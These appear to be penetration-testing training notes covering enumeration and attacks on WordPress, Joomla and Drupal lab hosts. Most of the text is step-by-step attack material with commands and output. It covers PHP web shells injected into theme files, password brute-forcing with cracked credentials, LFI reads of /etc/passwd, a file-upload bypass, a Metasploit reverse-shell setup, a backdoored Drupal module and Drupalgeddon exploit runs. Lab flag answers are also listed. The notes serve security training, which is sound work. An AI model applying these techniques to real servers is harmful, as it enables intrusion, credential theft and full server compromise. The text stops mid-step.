WordPress – Discovery, Enumeration & Attacking (Complete Notes)
WordPress – Discovery & Enumeration

WordPress is an open-source Content Management System (CMS) launched in 2003, written in PHP and typically running on Apache with MySQL as the backend database. It is extremely popular, powering around 32.5% of all websites on the internet, making it the most targeted CMS by attackers and the most commonly encountered platform during external penetration tests. WordPress offers over 50,000 plugins and 4,100+ GPL-licensed themes, which greatly expand its functionality but also introduce serious security risks through third-party code. According to WPScan statistics, 54% of known WordPress vulnerabilities come from plugins, 31.5% from WordPress core, and 14.5% from themes — meaning plugins are the biggest attack surface. A study showed that roughly 8% of WordPress hacks happen due to weak passwords, while 60% were due to an outdated WordPress version being left unpatched. Major companies including The New York Times, Disney, Forbes, Sony, eBay, and Facebook have all used WordPress, confirming that it is used at enterprise scale and must be taken seriously during security assessments.

Discovery / Footprinting

The first step in identifying a WordPress site is browsing to the /robots.txt file, which often reveals WordPress-specific paths and directory names that confirm the CMS in use. A typical WordPress robots.txt contains entries like Disallow: /wp-admin/, Allow: /wp-admin/admin-ajax.php, and Disallow: /wp-content/uploads/wpforms/ — the presence of /wp-admin and /wp-content is a dead giveaway. Browsing to the /wp-admin/ directory will automatically redirect you to /wp-login.php, which is the back-end login portal of the WordPress installation. WordPress stores all installed plugins inside wp-content/plugins/ and all themes inside wp-content/themes/ — both directories are critical enumeration targets. There are five default user roles in WordPress: Administrator (full access including source code editing), Editor (manages all posts), Author (manages own posts), Contributor (writes but cannot publish), and Subscriber (basic browsing only). Gaining Administrator access is usually sufficient to achieve full Remote Code Execution (RCE) on the server, as the Theme Editor allows direct PHP code modification.

Enumeration
Step 1 — Identify WordPress Version Using cURL
bash
curl -s http://blog.inlanefreight.local | grep WordPress

What this does: curl -s fetches the page silently with no progress output. The output is piped into grep WordPress which searches for any line containing the word "WordPress". The result looks like:

html
<meta name="generator" content="WordPress 5.8" />

This <meta name="generator"> tag is added by WordPress by default in the HTML source and directly reveals the version number — in this case WordPress 5.8. Note this version down as it will be used to search for known CVEs.

Step 2 — Identify the Active Theme
bash
curl -s http://blog.inlanefreight.local/ | grep themes

What this does: This fetches the homepage HTML and searches for any reference to the themes folder inside wp-content. The output reveals:

href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css'

This tells us the Business Gravity theme is active (later WPScan will refine this to Transport Gravity, a child theme). Knowing the theme name and version allows us to search for known vulnerabilities affecting that specific theme.

Step 3 — Identify Installed Plugins from Homepage
bash
curl -s http://blog.inlanefreight.local/ | grep plugins

What this does: This searches all HTML on the homepage for references to the wp-content/plugins/ directory. WordPress loads plugin CSS and JavaScript files by referencing their paths in the HTML, which exposes both the plugin name and version. The output reveals:

.../plugins/contact-form-7/includes/css/styles.css?ver=5.4.2
.../plugins/mail-masta/lib/subscriber.js?ver=5.8
.../plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8
.../plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8
.../plugins/contact-form-7/includes/js/index.js?ver=5.4.2

From this output we confirm two plugins: Contact Form 7 (version 5.4.2) and mail-masta. The ver=5.8 shown for mail-masta is actually the WordPress core version, not the plugin version — we must check its readme.txt separately.

Step 4 — Check Plugin readme.txt for Version Number
bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

Or browse directly in browser to:

http://blog.inlanefreight.local/wp-content/plugins/mail-masta/

What this does: If directory listing is enabled, you will see all files inside the plugin folder. The readme.txt file contains the plugin's stable version tag. This confirms mail-masta version 1.0.0, which suffers from a Local File Inclusion (LFI) vulnerability published in August 2021.

Step 5 — Find Additional Plugins on Post Pages
bash
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

What this does: Some plugins only load their assets on specific pages, not the homepage. Fetching post ID ?p=1 and grepping for plugins reveals:

.../plugins/wpdiscuz/themes/default/style.css?ver=7.0.4

And buried inside the page HTML content:

html
<p><a href="http://wordpress.org/plugins/wp-sitemap-page/">Powered by "WP Sitemap Page"</a></p>

This reveals two more plugins — wpDiscuz version 7.0.4 (vulnerable to unauthenticated RCE — CVE-2020-24186) and WP Sitemap Page.

Step 6 — Find WP Sitemap Page Version
bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt

What this does: Reads the readme.txt of the WP Sitemap Page plugin. At the top of the file you will see:

Stable tag: 1.6.4

Version = 1.6.4

Enumerating Users

WordPress is vulnerable to username enumeration because it returns different error messages depending on whether a username exists or not. When you attempt login at http://blog.inlanefreight.local/wp-login.php with a valid username but wrong password, the error reads:

The password for username admin is incorrect.

When you use an invalid username, the error reads:

The username someone is not registered on this site.

This behavioral difference allows an attacker to systematically confirm which usernames are registered. By testing different usernames manually or using WPScan, we confirm valid users. At this stage our confirmed data points are: WordPress 5.8, Transport Gravity theme, plugins (Contact Form 7, mail-masta v1.0.0, wpDiscuz v7.0.4, WP Sitemap Page v1.6.4), and confirmed user: admin. User enumeration is a critical step before any brute-force attack.

WPScan

WPScan is a dedicated automated WordPress security scanner that performs both passive and aggressive enumeration of WordPress installations. It is pre-installed on Parrot OS; if not available, install it with:

bash
sudo gem install wpscan

What this does: Uses Ruby's gem package manager to download and install the latest version of WPScan globally on the system.

Step 1 — View Help Menu
bash
wpscan -h

What this does: Displays all available flags and options including --url, --enumerate, --detection-mode, --api-token, -t, and -o.

Step 2 — Run Full Enumeration Scan
bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token YOUR_TOKEN

What each flag does:

--url — sets the target WordPress URL
--enumerate — enables full enumeration (plugins, themes, users, media, backups)
--api-token — passes your WPVulnDB API key to pull live vulnerability data
WPScan Results — Full Summary

Users Found:

admin
doug

Found via RSS Generator (passive) and Author ID Brute Forcing (aggressive). Both confirmed via Login Error Messages, meaning the login page returned different errors for these usernames proving they exist.

WordPress Version:

WordPress 5.8 — INSECURE (50 vulnerabilities identified)

Found via RSS Generator at /?feed=rss2.

Theme Found:

Transport Gravity — Version 1.0.1
Location: /wp-content/themes/transport-gravity/
Directory listing is ENABLED on this theme folder

Plugins Found by WPScan:

contact-form-7  —  Version 5.4.2  (outdated, latest is 6.1.7)
mail-masta      —  Version 1.0

WPScan did NOT find wpDiscuz or WP Sitemap Page — those required manual enumeration using curl | grep plugins on post pages. This is exactly why manual and automated enumeration must always be combined.

Vulnerabilities Per Plugin:

contact-form-7 v5.4.2 has 4 vulnerabilities:

Authenticated (Editor+) Arbitrary File Upload — fixed in 5.8.4
Reflected Cross-Site Scripting — fixed in 5.9.2
Unauthenticated Open Redirect — fixed in 5.9.5
Order Replay Vulnerability — fixed in 6.0.6

mail-masta v1.0 has 2 vulnerabilities:

Unauthenticated Local File Inclusion (LFI) — CVE-2016-10956
Multiple SQL Injection — CVE-2017-6095 through CVE-2017-6578

Other Important Findings:

XML-RPC enabled          →  http://blog.inlanefreight.local/xmlrpc.php
Upload directory listing →  http://blog.inlanefreight.local/wp-content/uploads/
WordPress readme exposed →  http://blog.inlanefreight.local/readme.html
WP-Cron enabled          →  http://blog.inlanefreight.local/wp-cron.php
Attacking WordPress
Login Bruteforce

With confirmed usernames (admin and doug) from WPScan, the next step is brute-forcing passwords. WPScan supports two attack methods: wp-login (attacks login page directly) and xmlrpc (faster, uses the XML-RPC API). The xmlrpc method is preferred because it tests multiple credentials in a single HTTP request.

Run the brute-force attack against doug:

bash
sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

What each flag does:

--password-attack xmlrpc — uses the XML-RPC API method for faster brute-forcing
-t 20 — uses 20 threads simultaneously to speed up the attack
-U doug — specifies the username to attack
-P /usr/share/wordlists/rockyou.txt — the password wordlist to iterate through
--url — the target WordPress URL

Result:

[SUCCESS] - doug / jessica1
[!] Valid Combinations Found:
 | Username: doug, Password: jessica1

Confirmed credentials: doug:jessica1

Code Execution
Step 1 — Log in to WordPress Admin Panel

Using credentials doug:jessica1, log in at:

http://blog.inlanefreight.local/wp-login.php

After successful login you are redirected to the WordPress admin dashboard at /wp-admin/.

Step 2 — Navigate to Theme Editor

In the left sidebar click Appearance → Theme Editor. This allows direct editing of PHP source code of any installed theme. Never edit the active theme (Transport Gravity) as it could break the live site. Instead select the inactive theme Twenty Nineteen.

Step 3 — Inject Web Shell into 404.php

In the Theme Editor select the 404.php file from Twenty Nineteen. Add this single line just below the existing comments:

php
<?php system($_GET[0]); ?>

What this does: The system() function executes a shell command. $_GET[0] takes the value of URL parameter 0 and passes it to the shell. This creates a web shell where any OS command can be run via the URL. Click Update File to save.

Step 4 — Execute Commands via Web Shell
bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

RCE confirmed as www-data. Replace id with any command to execute it on the server.

Step 5 — Find System Users with /bin/bash
bash
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/etc/passwd" | grep /bin/bash

Output shows:

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
webadmin:x:1001:1001::/home/webadmin:/bin/bash

Answer = webadmin is the additional system user with an interactive bash shell.

Step 6 — Find and Read the Flag

Always confirm the actual webroot first — never assume it is /var/www/html/:

bash
# Check current directory
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=pwd"

# List webroot contents
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/"

# Find flag file
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=find+/var/www+-name+flag*"

The actual webroot on this machine was NOT /var/www/html/ — it was:

/var/www/blog.inlanefreight.local/

This is because the server uses a virtual host setup, meaning each domain gets its own folder under /var/www/. The flag file also had a unique hash in its name:

flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt

Read the flag:

bash
curl -s "http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"

Flag = l00k_ma_unAuth_rc3!

Metasploit — wp_admin_shell_upload (Alternative RCE Method)

As an alternative to manual code injection, Metasploit's wp_admin_shell_upload module automates the entire process by uploading a malicious plugin and returning a PHP Meterpreter shell.

bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

Set all required options:

bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username doug
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password jessica1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.217
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.128.213
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local

Verify options:

bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

What each option does:

username / password — WordPress admin credentials to authenticate with
lhost — your attacker machine IP where the reverse shell connects back to
rhost — the target server IP address
VHOST — virtual hostname of the WordPress site (required when IP and hostname differ)
LPORT — defaults to 4444, the port receiving the reverse shell

Launch the exploit:

bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

What happens step by step:

Metasploit authenticates to WordPress using doug:jessica1
Uploads a malicious PHP plugin file to /wp-content/plugins/
Executes the plugin to trigger a PHP Meterpreter reverse shell
Opens a Meterpreter session back to your LHOST:4444
Automatically cleans up the uploaded plugin files

Confirm access:

bash
meterpreter > getuid
Server username: www-data (33)

All artifacts created during the Metasploit exploit must be cleaned up and documented in the pentest report appendices including exploited systems, compromised users, artifacts created, and any changes made.

Leveraging Known Vulnerabilities
Vulnerable Plugins – mail-masta (LFI)

The mail-masta plugin version 1.0.0 contains a critical unauthenticated LFI vulnerability in count_of_send.php. The vulnerable code:

php
<?php
include($_GET['pl']);

The pl GET parameter is passed directly into include() with zero validation. Exploit it to read /etc/passwd:

bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

What this does: Sends a GET request with pl=/etc/passwd. The include() function reads and outputs the system password file returning all user entries. From the output, lines ending in /bin/bash identify interactive login users: root, ubuntu, and webadmin. This requires zero authentication.

Vulnerable Plugins – wpDiscuz (Unauthenticated RCE)

wpDiscuz version 7.0.4 contains CVE-2020-24186 — an unauthenticated file upload bypass that allows uploading PHP web shells by tricking MIME type detection.

bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

What each parameter does:

-u — the target WordPress URL
-p /?p=1 — a valid post path (comment upload form only exists on posts)

What the script does step by step:

Fetches the post page to retrieve the wmuSecurity nonce (anti-CSRF token)
Generates a random PHP filename (e.g., uthsdkbywoxeebg)
Uploads the PHP shell disguised as an image to /wp-content/uploads/
Returns the full URL of the uploaded shell

The script's built-in execution may fail, so trigger it manually:

bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

Output:

GIF689a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)

The GIF689a; prefix is the MIME bypass trick — the file starts with a GIF magic byte signature to fool the upload validator. RCE confirmed. The shell file must be deleted after testing and listed as a testing artifact in the report.

Complete Final Answers Summary
Question	Command / Method	Answer
Q1 — Find flag.txt in uploads	WPScan finds open dir → browse /wp-content/uploads/2021/08/	0ptions_ind3xeS_ftw!
Q2 — Hidden plugin name	curl /?p=1 | grep plugins	WP Sitemap Page
Q3 — Plugin version	curl .../wp-sitemap-page/readme.txt	1.6.4
Q4 — Other user besides admin	WPScan user enumeration	doug
Q5 — doug's password	WPScan brute force xmlrpc with rockyou.txt	jessica1
Q6 — System user with /bin/bash	LFI or RCE → cat /etc/passwd | grep /bin/bash	webadmin
Q7 — Webroot flag contents	RCE → find /var/www -name flag* → cat the file	l00k_ma_unAuth_rc3!

Joomla - Discovery & Enumeration
Joomla - Discovery & Enumeration

Joomla is a free and open-source Content Management System (CMS) released in August 2005, written in PHP and using MySQL as the backend database. It is used for a wide variety of purposes including discussion forums, photo galleries, e-Commerce, and user-based communities. Like WordPress, Joomla can be enhanced with over 7,000 extensions and over 1,000 templates, making it highly customizable for different needs. There are up to 2.5 million sites on the internet currently running Joomla, which accounts for 3.5% of the CMS market share. The name Joomla means "all together" in Swahili (phonetic spelling of "Jumla"), reflecting its community-driven nature with close to 700,000 users in its online forums. Some notable organizations using Joomla include eBay, Yamaha, Harvard University, and the UK government, and over 770 different developers have contributed to it over the years.

Discovery/Footprinting

When encountering an unknown web application during an external penetration test, fingerprinting the CMS in use is an important first step before attempting any attack. The first way to confirm a Joomla site is by looking at the page source and grepping for the word "Joomla" which will reveal a generator meta tag. The robots.txt file on a Joomla installation contains many disallowed directories like /administrator/, /bin/, /cache/, /cli/, /components/, /includes/, /installation/, /language/, /layouts/, /libraries/, /logs/, /modules/, /plugins/, and /tmp/ — all of which confirm Joomla is in use. The Joomla favicon is also a telltale sign but is not always present. The README.txt file, if present, often reveals the Joomla version number directly and is one of the quickest ways to fingerprint the installation. The administrator/manifests/files/joomla.xml file provides detailed version information in XML format and the plugins/system/cache/cache.xml file can give the approximate version as well.

Step 1 — Grep Page Source for Joomla
bash
curl -s http://dev.inlanefreight.local/ | grep Joomla

What this does: curl -s fetches the page silently without showing progress. The output is piped to grep Joomla which searches for any line containing the word "Joomla". The output reveals:

html
<meta name="generator" content="Joomla! - Open Source Content Management" />

This generator meta tag confirms we are dealing with a Joomla installation.

Step 2 — Read README.txt for Version
bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5

What this does: Fetches the README.txt file from the Joomla installation root. The head -n 5 command shows only the first 5 lines which is enough to see the version. Output:

1- What is this?
    * This is a Joomla! installation/upgrade package to version 3.x
    * Joomla! Official site: https://www.joomla.org
    * Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history

This confirms the Joomla 3.x version branch is in use.

Step 3 — Read joomla.xml for Exact Version
bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

What this does: Fetches the joomla.xml manifest file which contains exact version information. The xmllint --format - command formats the XML output to be human-readable. The output reveals:

xml
<version>3.9.4</version>
<creationDate>March 2019</creationDate>

This gives us the exact version 3.9.4 which we can now use to search for known CVEs.

Step 4 — Query the Joomla API for Statistics
bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

What this does: Sends a request to the official Joomla developer API which returns anonymous usage statistics. The python3 -m json.tool formats the JSON output to be readable. The output shows version distribution across over 2.7 million Joomla installs, confirming how widespread Joomla is. This is useful for understanding the target landscape during reconnaissance.

Enumeration
Step 1 — Install and Run droopescan

droopescan is a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle. It can be installed via pip:

bash
sudo pip3 install droopescan

What this does: Uses Python's pip package manager to download and install droopescan and all its dependencies globally on the system.

Verify it is working:

bash
droopescan -h

What this does: Displays the droopescan help menu showing available subcommands like scan and stats, and example usage patterns like droopescan scan drupal -u URL_HERE. Now run a scan against the Joomla target:

bash
droopescan scan joomla --url http://dev.inlanefreight.local/

What each part does:

scan joomla — tells droopescan to scan a Joomla installation specifically
--url http://dev.inlanefreight.local/ — sets the target URL to scan

Output reveals:

[+] Possible version(s):
    3.8.10
    3.8.11
    3.8.12
    3.8.13

[+] Possible interesting urls found:
    Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
    Login page. - http://dev.inlanefreight.local/administrator/
    License file. - http://dev.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml

droopescan provides a version range and interesting URLs but does not give deep plugin information for Joomla.

Step 2 — Install and Run JoomlaScan

JoomlaScan is a Python tool inspired by the OWASP joomscan tool. It requires Python 2.7 and the bs4 dependency. Reference: https://github.com/drego85/JoomlaScan

Install the dependency first:

bash
python2 -m pip install bs4

What this does: Uses Python 2's pip to install the BeautifulSoup4 library which JoomlaScan depends on for HTML parsing. Now run the scan:

bash
python2 joomlascan.py -u http://dev.inlanefreight.local

What this does: Runs JoomlaScan against the target URL using 10 concurrent threads. It checks for installed Joomla components by sending requests to known component paths like index.php?option=com_actionlogs. The output finds accessible directories, LICENSE files, and components including com_actionlogs, com_admin, com_ajax, and com_banners. This helps identify explorable directories and the installed component list.

Step 3 — Brute Force the Admin Login

The administrator login portal is located at http://dev.inlanefreight.local/administrator/index.php. Joomla returns a generic error message for failed logins making user enumeration difficult:

Warning: Username and password do not match or you do not have an account yet.

The default administrator account is admin but the password is set at install time. Use the brute-force script with a password wordlist. Reference: https://github.com/ajnik/joomla-bruteforce

bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

What each flag does:

-u http://dev.inlanefreight.local — the target Joomla URL
-w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt — the password wordlist to iterate through
-usr admin — the username to brute-force against

Result:

admin:admin

Credentials admin:admin confirmed. This is a clear case of weak default credentials not being changed after installation.

Attacking Joomla
Attacking Joomla

With confirmed admin credentials admin:admin, we can now log into the Joomla back-end and abuse built-in functionality to gain Remote Code Execution. Like WordPress and Drupal, Joomla has suffered from various vulnerabilities in core and extensions, and gaining admin access to the back-end is typically sufficient to achieve full code execution on the server. The primary method we will use is modifying a template file through the Joomla template editor to inject a PHP web shell, similar to the WordPress Theme Editor approach. Joomla also has a history of CVEs — at the time of writing there have been 426 Joomla-related vulnerabilities receiving CVEs, with the vast majority relating to extensions rather than Joomla core. We will also look at CVE-2019-10945, a directory traversal and authenticated file deletion vulnerability affecting version 3.9.4 specifically.

Abusing Built-In Functionality
Step 1 — Log in to the Joomla Administrator Panel

Browse to:

http://dev.inlanefreight.local/administrator

Log in using the credentials admin:admin. If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to:

http://dev.inlanefreight.local/administrator/index.php?option=com_plugins

Disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.

Step 2 — Navigate to Templates

From the admin panel, click on Templates on the bottom left under the Configuration section. This brings up the templates menu showing all installed templates including Beez3 and Protostar.

Step 3 — Select Protostar Template

Click on the template name protostar under the Template column header. This brings us to the Templates: Customise page where we can edit the PHP source files of this template directly.

Step 4 — Edit error.php and Inject Web Shell

Click on the error.php page to pull up its source code. Add the following PHP one-liner just below the existing code. Using a hashed parameter name instead of the common cmd makes the shell less easily discoverable by drive-by attackers:

php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);

What this does: The system() function executes a shell command. $_GET['dcfdd5e021a869fcc6dfaef8bf31377e'] takes the value of the URL parameter with that hashed name and passes it directly to the shell. Click Save & Close at the top to save the change.

Step 5 — Execute Commands via Web Shell
bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

What this does: Sends a GET request to the modified error.php file with the hashed parameter set to id. The system() function executes the id command on the server and returns the output. Result:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

RCE confirmed as www-data. From here we can run any command or upgrade to a full interactive reverse shell. After testing, remove the PHP snippet from error.php and document the file name and location in the pentest report appendices.

Leveraging Known Vulnerabilities
CVE-2019-10945 — Directory Traversal (Joomla 3.9.4)

This version of Joomla is vulnerable to CVE-2019-10945, a directory traversal and authenticated file deletion vulnerability. We can use the exploit script to list contents of the webroot and other directories. This is useful when the admin login portal is accessible and we have admin credentials.

bash
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /

What each flag does:

--url — the full URL to the Joomla administrator directory
--username admin — the admin username
--password admin — the admin password
--dir / — the directory to list (starting from root)

Output reveals the webroot contents:

administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt

This confirms the vulnerability is exploitable. The configuration.php file is particularly interesting as it typically contains database credentials. This vulnerability could allow access to sensitive files if accessible via the application URL.

Drupal - Discovery & Enumeration
Drupal - Discovery & Enumeration

Drupal, launched in 2001, is the third major CMS covered in this module and is another open-source CMS popular among companies and developers. It is written in PHP and supports MySQL or PostgreSQL for the backend, with SQLite available if no DBMS is installed. Like WordPress, Drupal allows users to enhance websites through themes and modules — at the time of writing the Drupal project has nearly 43,000 modules and 2,900 themes. Around 1.5% of sites on the internet run Drupal (over 1.1 million sites), and it accounts for approximately 2.4% of the CMS market share and is used in 100 languages. Some major brands using Drupal include Tesla and Warner Bros Records, and 56% of government websites across the world use Drupal. During penetration tests, Drupal is encountered less frequently than WordPress but still represents a significant target due to its presence in government, education, and enterprise environments.

Discovery/Footprinting

A Drupal website can be identified in several ways including the header or footer message "Powered by Drupal", the standard Drupal logo, the presence of a CHANGELOG.txt or README.txt file, via the page source, or clues in the robots.txt file such as references to /node. Drupal indexes its content using nodes — a node can hold anything such as a blog post, poll, or article — and page URIs are usually of the form /node/<nodeid> which is a strong Drupal indicator. Drupal supports three types of users by default: Administrator (complete control over the website), Authenticated User (can log in and perform operations based on permissions), and Anonymous (all website visitors who can only read posts by default). The quickest fingerprinting method is to grep the page source for the word "Drupal":

bash
curl -s http://drupal.inlanefreight.local | grep Drupal

What this does: Fetches the Drupal homepage silently and greps for "Drupal". Output:

html
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
<span>Powered by <a href="https://www.drupal.org">Drupal</a></span>

This confirms Drupal 8 is in use.

Enumeration
Step 1 — Check CHANGELOG.txt for Version
bash
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

What this does: Fetches the CHANGELOG.txt file which lists all version history. The -m2 flag limits grep to return only the first 2 matching lines which is enough to see the version. Output:

Drupal 7.57, 2018-02-21

This confirms Drupal 7.57 on this older installation. However, newer Drupal versions block access to this file by default and return a 404:

bash
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

Output:

html
<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1>

When CHANGELOG.txt is blocked, use droopescan instead.

Step 2 — Run droopescan Against Drupal

droopescan has much more functionality for Drupal than for Joomla:

bash
droopescan scan drupal -u http://drupal.inlanefreight.local

What each part does:

scan drupal — tells droopescan to use its Drupal-specific scanning functionality
-u http://drupal.inlanefreight.local — sets the target Drupal URL

Output:

[+] Plugins found:
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login

[+] Scan finished (0:03:19.199526 elapsed)

This instance appears to be running Drupal 8.9.1. The PHP module is also found installed, which is important for our attack approach. The default admin login page is at /user/login.

Attacking Drupal
Attacking Drupal

Now that we have confirmed Drupal and fingerprinted the version, we can look for misconfigurations and vulnerabilities to gain internal network access. Unlike some CMS platforms, obtaining a shell on a Drupal host via the admin console is not as easy as editing a PHP file in a theme — Drupal requires specific modules or backdoored module uploads to achieve code execution. We will cover three attack methods: leveraging the PHP Filter Module (for older Drupal versions before 8), uploading a backdoored module, and exploiting the three major Drupalgeddon vulnerabilities (CVE-2014-3704, CVE-2018-7600, and CVE-2018-7602) which have been dubbed Drupalgeddon, Drupalgeddon2, and Drupalgeddon3 respectively. Each of these represents a different level of authentication requirement and impact.

Leveraging the PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as admin and enable the PHP filter module which allows embedded PHP code and snippets to be evaluated directly in content pages.

Step 1 — Enable PHP Filter Module

Navigate to admin/modules and tick the checkbox next to the PHP Filter module. Scroll down and click Save configuration.

Step 2 — Create Malicious Content Page

Navigate to Content → Add content → Basic page. Create a page with the following malicious PHP snippet. Using an MD5 hash as the parameter name avoids making the shell easily accessible to drive-by attackers:

php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>

Set the Text format dropdown to PHP code. Click Save.

Step 3 — Execute Commands via Web Shell
bash
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

What this does: Fetches the newly created page (node/3) with the hashed parameter set to id. The output is piped to grep uid which finds the line containing the command output, then cut -f4 -d">" extracts the actual uid value by splitting on > and taking the 4th field. Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

RCE confirmed. From version 8 onwards, the PHP Filter module is not installed by default and must be downloaded manually from the Drupal website and uploaded.

Uploading a Backdoored Module

Drupal allows users with appropriate permissions to upload new modules. A backdoored module is created by adding a shell to an existing legitimate module.

Step 1 — Download a Legitimate Module

Download the CAPTCHA module:

bash
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

What this does: wget --no-check-certificate downloads the CAPTCHA module archive bypassing SSL certificate checks. tar xvf extracts the archive, creating the captcha folder.

Step 2 — Create the PHP Web Shell
php
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>

Save this as shell.php inside the captcha folder.

Step 3 — Create .htaccess File

Drupal denies direct access to the /modules folder. Create a .htaccess file to allow access:

html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

What this does: This Apache configuration applies URL rewriting rules for the root / folder, which allows direct HTTP requests to files within the modules directory to be processed correctly.

Step 4 — Create Backdoored Archive
bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

What this does: Moves both the shell and .htaccess into the captcha folder, then tar cvf creates a new gzipped archive of the entire backdoored captcha folder.

Step 5 — Upload and Install the Module

Navigate to Manage → Extend → + Install new module. Browse to the backdoored captcha archive and click Install.

Step 6 — Execute Commands
bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

Output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

RCE confirmed. Remove or disable the PHP Filter module, delete all created pages, and remove the backdoored module after testing. Document everything in the report.

Leveraging Known Vulnerabilities

Over the years, Drupal core has suffered from three major remote code execution vulnerabilities each dubbed Drupalgeddon:

CVE-2014-3704 (Drupalgeddon) — affects versions 7.0 up to 7.31, fixed in 7.32. Pre-authenticated SQL injection flaw used to upload malicious forms or create new admin users.
CVE-2018-7600 (Drupalgeddon2) — affects Drupal prior to 7.58 and 8.5.1. RCE due to insufficient input sanitization during user registration allowing system-level command injection.
CVE-2018-7602 (Drupalgeddon3) — affects multiple versions of Drupal 7.x and 8.x. Authenticated RCE exploiting improper validation in the Form API.
Drupalgeddon
Run the Exploit Script
bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

What each flag does:

-t http://drupal-qa.inlanefreight.local — the target Drupal URL
-u hacker — the username for the new admin account to create
-p pwnd — the password for the new admin account

Output:

[!] VULNERABLE!
[!] Administrator user created!
[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node

The exploit uses a pre-authentication SQL injection to insert a new administrator user into the database. Log in as hacker:pwnd and then use any of the code execution methods described above. This can also be exploited using the exploit/multi/http/drupal_drupageddon Metasploit module.

Drupalgeddon2
Step 1 — Run the PoC Script
bash
python3 drupalgeddon2.py

Enter the target URL when prompted:

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

The script uploads a hello.txt file to confirm the vulnerability:

bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt

Output:

;-)

File upload confirmed, vulnerability is present.

Step 2 — Create Malicious PHP Shell
php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>

Encode it to base64:

bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

Output:

